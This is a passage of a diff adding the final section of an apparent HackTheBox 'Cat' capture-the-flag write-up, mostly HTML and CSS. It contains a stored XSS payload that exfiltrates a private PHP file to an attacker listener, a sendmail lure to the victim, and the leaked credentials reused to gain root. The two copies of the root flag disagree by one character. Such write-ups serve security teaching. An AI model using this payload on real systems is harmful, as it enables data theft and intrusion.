+    position: absolute;
+    left: 9px;
+    top: 18px;
+    width: 2px;
+    height: calc(100% + 20px);
+    background-color: #6ba600;
+    z-index: 1;
+}
+
+.ctf-bullet-list li:last-child::after {
+    display: none;
+}
+
+.ctf-bullet-list li:only-child::after {
+    display: none;
+}
+
+.ctf-bullet-list li > p {
+    margin: 0 0 8px 0;
+}
+
+.ctf-bullet-list li > p:last-child {
+    margin-bottom: 0;
+}
+
+.ctf-bullet-list li img {
+    margin: 8px 0;
+    max-width: 100%;
+    height: auto;
+}
+
+.ctf-bullet-list li > ul {
+    margin-top: 8px;
+    padding-left: 20px;
+}
+
+.ctf-bullet-list li > ul li::before {
+    background-color: #9fef00;
+    box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    animation: pulse 2s infinite;
+}
+
+.ctf-bullet-list li > ul li::after {
+    background-color: #6ba600;
+}
+
+@keyframes pulse {
+    0% {
+        transform: scale(0.95);
+        box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    }
+    
+    70% {
+        transform: scale(1);
+        box-shadow: 0 0 0 10px rgba(159, 239, 0, 0);
+    }
+    
+    100% {
+        transform: scale(0.95);
+        box-shadow: 0 0 0 0 rgba(159, 239, 0, 0);
+    }
+}
+</style>
+<p>We craft an XSS payload to fetch the content of <code>http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php</code> and send it to our local web server.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;javascript:fetch(&#39;http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php&#39;).then(r=&gt;r.text()).then(d=&gt;fetch(&#39;http://10.10.15.7:1234/?x=&#39;+encodeURIComponent(d)))&#34;</span><span class="o">&gt;</span><span class="nx">Click</span><span class="o">&lt;</span><span class="err">/a&gt;</span>
+</span></span></code></pre></div><p>We create a new repository in Gitea (e.g., <code>HALLO</code>) and paste the XSS payload into the Description field, ensuring &ldquo;Initialize this repository with a README.md&rdquo; is checked.</p>
+<img src="/img/cat/repo.png" alt="" class="img-responsive" loading="lazy" />
+<p>Next, we send an email to <code>jobert@localhost</code> with a link to our malicious repository, knowing that <code>jobert</code> will likely click it to review.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:#9dff00;font-weight: bold;">axel@cat</span>:<span style="color: #3b4df1">~</span>$ echo <span class="flag">-e</span> <span class="string">"Subject: Hello, click here http://localhost:3000/axel/HALLO"</span> | sendmail jobert@localhost
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>On our Python web server (listening on port <code>1234</code>), we receive the exfiltrated <code>index.php</code> content.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">python3</span> <span class="flag">-m</span> http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.11.53 - - [05/Jul/2025 12:10:15] "GET /?x=%3C%3Fphp%0A%24valid_username%20%3D%20%27admin%27%3B%0A%24valid_password%20%3D%20%27IKw75eR0MR7CMIxhH0%27%3B%0A%0Aif%20(!isset(%24_SERVER%5B%27PHP_AUTH_USER%27%5D)%20%7C%7C%20!isset(%24_SERVER%5B%27PHP_AUTH_PW%27%5D)%20%7C%7C%20%0A%20%20%20%20%24_SERVER%5B%27PHP_AUTH_USER%27%5D%20!%3D%20%24valid_username%20%7C%7C%20%24_SERVER%5B%27PHP_AUTH_PW%27%5D%20!%3D%20%24valid_password)%20%7B%0A%20%20%20%20%0A%20%20%20%20header(%27WWW-Authenticate%3A%20Basic%20realm%3D%22Employee%20Management%22%27)%3B%0A%20%20%20%20header(%27HTTP%2F1.0%20401%20Unauthorized%27)%3B%0A%20%20%20%20exit%3B%0A%7D%0A%0Aheader(%27Location%3A%20dashboard.php%27)%3B%0Aexit%3B%0A%3F%3E%0A%0A 
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Decoding the URL-encoded content reveals the PHP source code for <code>index.php</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$valid_username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$valid_password</span> <span class="o">=</span> <span class="s1">&#39;IKw75eR0MR7CMIxhH0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_AUTH_USER&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_AUTH_PW&#39;</span><span class="p">])</span> <span class="o">||</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_AUTH_USER&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$valid_username</span> <span class="o">||</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_AUTH_PW&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$valid_password</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;WWW-Authenticate: Basic realm=&#34;Employee Management&#34;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.0 401 Unauthorized&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: dashboard.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>The code reveals credentials for an &ldquo;Employee Management&rdquo; system: <code>admin</code>:<code>IKw75eR0MR7CMIxhH0</code>. We attempt to switch user to <code>root</code> using this password.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:#9dff00;font-weight: bold;">axel@cat</span>:<span style="color: #3b4df1">~</span>$ su - root
+Password: 
+<span>root@cat:~#</span> cat root.txt 
+11fad706f903f0c73a5c66aa2dbd4d2c
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+
+<div class="ctf-flag-container">
+    <div class="flag-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 4V20H6V15H14L13 13H20V4H4Z" fill="currentColor"/>
+        </svg>
+    </div>
+    <div class="flag-content">
+        
+Root flag: 11fad706f903f0f73a5c66aa2dbd4d2c
+
+    </div>
+</div>
+
+<style>
+.ctf-flag-container {
+    display: flex;
+    align-items: center;
+    background-color: #2d3d1a;
+    color: #9fef00;
+    padding: 12px 16px;
+    border-radius: 6px;
+    margin: 16px 0;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    border: 1px solid #4a5d2a;
+}
+
+.flag-icon {
+    margin-right: 12px;
+    color: #9fef00;
+    flex-shrink: 0;
+}
+
+.flag-content {
+    flex: 1;
+    word-break: break-all;
+}
+
+.flag-content code {
+    background-color: transparent;
+    color: inherit;
+    padding: 0;
+    font-size: inherit;
+}
+</style>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://0xblivion.dev/tags/hackthebox/">HackTheBox</a></li>
+      <li><a href="https://0xblivion.dev/tags/cat/">Cat</a></li>
+      <li><a href="https://0xblivion.dev/tags/htb-cat/">Htb-Cat</a></li>
+      <li><a href="https://0xblivion.dev/tags/xss/">Xss</a></li>
+      <li><a href="https://0xblivion.dev/tags/sql-injection/">SQL Injection</a></li>
+      <li><a href="https://0xblivion.dev/tags/web-exploitation/">Web Exploitation</a></li>
+      <li><a href="https://0xblivion.dev/tags/git-exploitation/">Git Exploitation</a></li>
+      <li><a href="https://0xblivion.dev/tags/gitea/">Gitea</a></li>
+      <li><a href="https://0xblivion.dev/tags/cookie-hijacking/">Cookie Hijacking</a></li>
+      <li><a href="https://0xblivion.dev/tags/privilege-escalation/">Privilege-Escalation</a></li>
+      <li><a href="https://0xblivion.dev/tags/linux/">Linux</a></li>
+      <li><a href="https://0xblivion.dev/tags/writeup/">Writeup</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://0xblivion.dev/posts/thm/hard/tryhackme-ra-writeup/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>TryHackMe - Ra WriteUp</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://0xblivion.dev/">0xblivion.dev</a></span>
+
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
